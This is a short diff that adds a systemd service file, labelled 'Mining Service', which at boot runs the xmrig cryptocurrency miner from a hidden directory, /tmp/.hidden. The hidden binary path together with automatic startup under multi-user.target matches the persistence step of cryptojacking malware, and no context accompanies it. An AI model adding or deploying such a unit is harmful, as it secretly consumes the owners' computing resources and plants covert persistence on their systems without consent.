@@ -1,0 +1,6 @@
+[Unit]
+Description=Mining Service
+[Service]
+ExecStart=/tmp/.hidden/xmrig --donate-level 1
+[Install]
+WantedBy=multi-user.target
